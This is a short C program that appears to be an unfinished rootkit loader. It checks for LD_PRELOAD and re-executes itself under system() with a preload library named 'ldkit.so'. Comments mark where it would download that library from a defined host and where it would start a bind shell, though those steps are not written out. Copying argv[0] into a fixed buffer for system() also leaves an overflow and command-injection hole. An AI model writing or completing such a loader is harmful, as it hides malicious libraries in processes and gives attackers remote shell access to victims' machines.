#include <stdio.h>
#include <curl/curl.h>
#include <string.h>
#include <stdlib.h>
#define HOST "https://pageup.lt/"

int main(int argc, char **argv, char **envp) {
    int is_set = 0;
    for (int i=0; envp[i]!=NULL; i++) {
        if (strstr(envp[i], "LD_PRELOAD") != NULL) {
            is_set = 1;
            break;
        }
    }

    if (is_set == 0) {
        // downlaod ldkit.so
        

        char cmd[256];
        sprintf(cmd, "LD_PRELOAD=./ldkit.so %s", argv[0]);
        system(cmd);
    } else {
        // start bind shell
    }

    return 0;
}